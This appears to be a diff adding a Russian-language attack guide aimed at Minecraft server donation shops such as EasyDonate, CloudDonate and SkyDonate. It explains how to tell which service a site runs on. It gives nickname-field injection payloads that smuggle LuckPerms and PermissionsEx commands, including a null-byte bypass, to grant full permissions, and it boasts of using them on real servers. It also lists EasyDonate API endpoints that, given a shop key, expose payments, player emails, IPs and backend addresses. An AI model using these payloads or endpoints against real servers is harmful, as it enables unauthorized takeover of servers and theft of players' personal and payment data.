@@ -1,0 +1,129 @@
+Всего существует 4 распостраненых сервиса для обслуживания донатом.
+trademc (https://trademc.org/)
+EasyDonate (https://easydonate.ru/)
+CloudDonate (https://cdonate.ru/)
+SkyDonate (https://skydonate.ru/)
+
+Как определить, на каком сервисе стоит сайт:
+EasyDonate > plugins/easyx в сурсах
+CloudDonate > "https://dashboard.cdonate.ru/api/v1" в главном классе сайта
+SkyDonate > Директория storage.skydonate.ru в сурсах
+
+---------------------------------------------------------------------------------------------------------
+            Инъекция через поле ввода ника
+
+            
+1. Инъекция через команду и поле ввода для ника через сайт с выдачей привилегии
+
+Метод найден кристаликом.
+
+Как работает пример обычной покупки доната?
+Торт покупает випа на Cake, и исполняется следующая команда в консоли сервера:
+/lp user Cake permission set vip true
+Но по сути в поле ввода ника нас ничто не ограничивает. Пользуемся.
+Прописываем в поле ввода Cake permission set * true server=survival
+и сервер это схавает как:
+/lp user Cake permission set * true server=survival permission set vip true
+Если с пексом не прокатывало такое, то лакпермс это прекрасно переваривает.
+
+Таким образом получили * на серверах дженро и позже сдмапили их.
+
+PermissionsEx (Не проверено, донат должен выдасться на несколько ников)
+  Player,Player1,Player2,Player3
+
+  a (Донат выдается на все аккаунты, имеющие a в нике, сервер может не выдержать и упасть)
+
+LuckPerms (Не проверено)
+  Player permission set * true server=survival
+
+2. Метод второй (https://github.com/Abends2/RedShift.190__WriteUps/blob/fdd8b206cb30c92919c2d526b7cede98affdb063/RedShift190-Stand/CTF/Tasks/Task%2016%20-%20GalacticCraft%20(Web%20%2B%20Joy).md)
+Инъекция + нулевой байт и пара обходов
+
+В поле ввода вводим:
+Для LuckPerms: nickname1 parent set * true\00
+Для PermissionsEx: add *\00
+---------------------------------------------------------------------------------------------------------
+            Выкачка платёжных данных через API
+
+
+1. EasyDonate
+
+Инструкция к API
+
+Корневая директория: https://easydonate.ru/api/v2/shop/ключ
+Пример ключа: ab4bde05209a2f0d820f2c81c0f77560
+
+v2/shop/ключ - Информация о сервере. Из полезного есть домен
+v2/shop/ключ/products - Список покупок. Указана команда для выдачи
+v2/shop/ключ/product/айди продукта - Покажет информацию об одной из возможных покупок. Айди может быть найден в products
+v2/shop/ключ/servers - Раскроет айпи бекендов
+v2/shop/ключ/server/айди сервера - Аналогично. Покажет информацию конкретного сервера
+v2/shop/ключ/server/payments - Самое сладенькое. Выводит все платежи, почты, айпи игроков и их покупочки
+v2/shop/ключ/payment/айди платежа - Аналогично
+v2/shop/ключ/payment/create - Создать платеж. Верификация вводных данных не спадает. Почти ничего интересного
+
+Далее нам потребуется Postman
+
+Корневая директория: https://easydonate.ru/api/v3/plugin/
+Метод: GET
+Header:
+Shop-key | ключ
+
+v3/plugin/EasyDonate.Surcharge/getSettings - Выдаст настройки оплаты
+
+v3/plugin/EasyDonate.Surcharge/getDiscounts - Выдаст настройки промокодов
+Query:
+username | ник
+
+v3/plugin/EasyDonate.Surcharge/getDiscountFor - Выдаст настройки промокодов для конкретного игрока
+Query:
+username | ключ
+product_id | айди покупки
+
+v3/plugin/EasyDonate.LastPayments/getSettings - Настройка последних покупок плагина
+v3/plugin/EasyDonate.LastPayments/getPayments - Вернет совершенные платежи игроками
+
+v3/plugin/EasyDonate.CustomMessages/getSettings - Настройка кастомных сообщений плагина
+
+v3/plugin/Discord.Widget/getSettings - Настройка виджетов дискорда плагина
+v3/plugin/Discord.Widget/getEmbed - Выдаст HTML код виджета дискорда
+
+v3/plugin/Vkontakte.Widget/getSettings - Настройка виджетов вконтакте плагина
+v3/plugin/Vkontakte.Widget/getEmbed - Выдаст HTML код виджета вконтакте
+
+v3/plugin/Vkontakte.News/getSettings - Настройка новостей вконтакте
+v3/plugin/Vkontakte.News/getNews - Выдаст последние новости из сообщества вконтакте
+
+v3/plugin/Vkontakte.MessagesWidget/getSettings - Настройка ЛС вк
+v3/plugin/Vkontakte.MessagesWidget/getEmbed - Выдаст HTML код ЛС вк
+
+v3/plugin/Yandex.Metrika/getSettings - Настройка Яндекс Метрики
+v3/plugin/Yandex.Metrika/getEmbed - Выдаст HTML код Яндекс Метрики
+
+v3/shop/servers - Раскроет айпи бекендов
+v3/shop/server/айди сервера 
+Path:
+id | айди сервера
+
+v3/shop/massSales - Список акций
+Query:
+where_active | boolean
+
+api/v3/shop/coupons - Список купонов
+Query:
+where_active | boolean
+
+api/v3/shop/payments
+
+v3/shop/payment/айди платежа
+Path:
+id | айди платежа
+
+v3/shop/payment/create - Создание платежа
+Query:
+customer | string
+server_id | айди сервера
+products | айди товара
+email | string
+coupon | string
+success_url | string
